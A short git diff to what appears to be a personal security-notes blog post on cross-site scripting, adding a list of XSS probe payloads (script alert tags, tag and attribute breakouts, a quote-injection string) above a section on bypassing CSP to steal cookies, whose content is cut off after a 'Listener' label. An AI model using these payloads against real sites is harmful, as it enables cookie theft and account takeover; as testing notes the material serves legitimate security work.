@@ -3,8 +3,19 @@ layout: post
 title: "xss"
 keywords: "xss, iframe, cookie"
 ---
-#### Bypass CSP and steal cookie using iframe
+#### Approach
+Check the context (inspect element)
 
+```
+<u>xss</u>
+<script>alert(1)</script>
+xss"><script>alert(1)</script>
+</title><script>alert(1)</script>
+xss%27;+alert(1);//xss
+
+```
+
+#### Bypass CSP and steal cookie using iframe
 
 ```
 # Listener
